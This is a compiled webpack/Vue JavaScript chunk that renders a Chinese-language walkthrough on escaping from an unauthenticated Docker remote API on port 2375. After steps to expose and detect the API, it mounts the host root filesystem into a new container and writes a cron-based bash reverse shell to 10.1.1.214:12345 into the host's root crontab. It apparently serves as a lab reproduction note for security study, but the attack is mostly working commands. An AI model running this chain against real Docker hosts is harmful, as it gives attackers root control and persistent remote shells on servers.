(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{808:function(s,a,t){"use strict";t.r(a);var e=t(112),r=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("center",[t("h1",[s._v("Docker 远程 API 未授权访问逃逸")])]),s._v(" "),t("hr"),s._v(" "),t("p",[s._v("docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker")]),s._v(" "),t("h1",{attrs:{id:"搭建"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#搭建"}},[s._v("#")]),s._v(" 搭建")]),s._v(" "),t("p",[s._v("将 docker 守护进程监听在 0.0.0.0")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("dockerd -H unix:///var/run/docker.sock -H "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0.0")]),s._v(".0.0:2375\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h1",{attrs:{id:"检测"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#检测"}},[s._v("#")]),s._v(" 检测")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("IP")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token variable"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("hostname")]),s._v(" -i "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("awk")]),s._v(" -F. "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'{print $1 "." $2 "." $3 ".1"}\'')]),s._v(" "),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("wget")]),s._v(" http://"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$IP")]),s._v(":2375\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("如果返回 404 说明存在")]),s._v(" "),t("img",{attrs:{width:"1200",src:"/img/1650014660.png"}}),s._v(" "),t("h1",{attrs:{id:"复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#复现"}},[s._v("#")]),s._v(" 复现")]),s._v(" "),t("p",[s._v("列出容器信息")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("target"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":2375/containers/json\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("查看容器")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" -H tcp://"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("target"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":2375 "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v(" -a\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("docker")]),s._v(" -H tcp://10.1.1.211:2375 run -it -v /:/mnt nginx:latest /bin/bash\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'* * * * * /bin/bash -i >& /dev/tcp/10.1.1.214/12345 0>&1'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /mnt/var/spool/cron/crontabs/root\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("本地监听端口，获取对方宿主机shell。")]),s._v(" "),t("Vssue")],1)}),[],!1,null,null,null);a.default=r.exports}}]);